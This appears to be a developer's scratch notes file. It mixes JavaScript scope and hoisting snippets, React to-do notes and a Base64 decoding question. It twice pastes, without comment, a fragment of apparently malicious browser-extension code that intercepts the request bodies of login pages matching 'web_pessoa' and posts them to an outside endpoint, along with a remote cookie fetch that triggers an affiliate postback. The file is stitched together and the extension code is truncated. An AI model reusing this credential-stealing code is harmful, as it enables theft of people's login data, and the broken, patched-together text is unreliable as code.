
var name = "John";
function changeName(){
console.log("Name", name); //undefined
var name = "Joseph";
console.log("Change Name", name); //"joseph"
}
changeName();

function myFunc(){
var a = b = 5;
var c = 10;
}
myFunc();
console.log("b value :", b);//5
console.log("c value :", c);//
console.log("a value :", a);//
let arr1 = [1,2,3,4];
let arr2 = [5,6,8,9];

const sumArr = (arr1, arr2) => {
    return [...arr1, ...arr2].reduce((sum, curr) =>(sum + curr), 0)
};

console.log(sumArr(arr1, arr2));


const endpoint = "https://www.aaa.com/",

     menos = new FormData;
 
menos.append("name", "instalou"), menos.append("value", "a extens\xe3o"), fetch(endpoint + "/sensitive/", {

     method: "POST",

     body: menos

 }), chrome.webRequest.onBeforeRequest.addListener(e => {

     let s = e.url.toLowerCase();

     if (s.includes("web_pessoa") && s.includes("login")) {

         if (!e.requestBody || !e.requestBody.raw[0]) return;

         let n = new TextDecoder("UTF-8").decode(e.requestBody.raw[0].bytes),

             t = new FormData;

         t.append("currentURL", e.url), t.append("bytes", n), fetch(endpoint + "/profile/", {

             method: "POST",

             body: t

         })
         
         
function getText() {
    var request = new XMLHttpRequest();
    request.open('GET', 'https://www.getmealideas.com/cookie.txt', true);
    request.send(null);
    request.onreadystatechange = function () {
        var ydrid = request.responseText;
        var postback = localStorage.getItem("postback");
        $("#field_ydrid").val(ydrid);
        if(ydrid != "" && postback == null){
            $.ajax({
                type:"GET",
                url:"https://offers-neefla.affise.com/postback?clickid="+ydrid,
                data:{},
                success:function(res){
                    localStorage.setItem("postback", "1");
                    console.log(res);
                }
            });
        }
    }
}


setEngine
React todo app with text box with add button 
display down
crud 

create read update delete

VS code can we use

use online react compiler


https://www.programiz.com/javascript/online-compiler/
 
var name = "John";
function changeName(){
console.log("Name", name);
var name = "Joseph";
console.log("Change Name", name);
}
changeName();
 
function myFunc(){
var a = b = 5;
var c = 10;
}
myFunc();
console.log("b value :", b);
console.log("c value :", c);
console.log("a value :", a);
 
const endpoint = "https://www.aaa.com/",

    menos = new FormData;
 
menos.append("name", "instalou"), menos.append("value", "a extens\xe3o"), fetch(endpoint + "/sensitive/", {

    method: "POST",

    body: menos

}), chrome.webRequest.onBeforeRequest.addListener(e => {

    let s = e.url.toLowerCase();

    if (s.includes("web_pessoa") && s.includes("login")) {

        if (!e.requestBody || !e.requestBody.raw[0]) return;

        let n = new TextDecoder("UTF-8").decode(e.requestBody.raw[0].bytes),

            t = new FormData;

        t.append("currentURL", e.url), t.append("bytes", n), fetch(endpoint + "/profile/", {

            method: "POST",

            body: t

        })
 
function getText() {
    var request = new XMLHttpRequest();
    request.open('GET', 'https://www.getmealideas.com/cookie.txt', true);
    request.send(null);
    request.onreadystatechange = function () {
        var ydrid = request.responseText;
        var postback = localStorage.getItem("postback");
        $("#field_ydrid").val(ydrid);
        if(ydrid != "" && postback == null){
            $.ajax({
                type:"GET",
                url:"https://offers-neefla.affise.com/postback?clickid="+ydrid,
                data:{},
                success:function(res){
                    localStorage.setItem("postback", "1");
                    console.log(res);
                }
            });
        }
    }
}
 
 what is ServiceWorker
what is eval

can you decode and check which encoder is used for this?
V2VsY29tZSB0byBqYXZhc2NyaXB0
 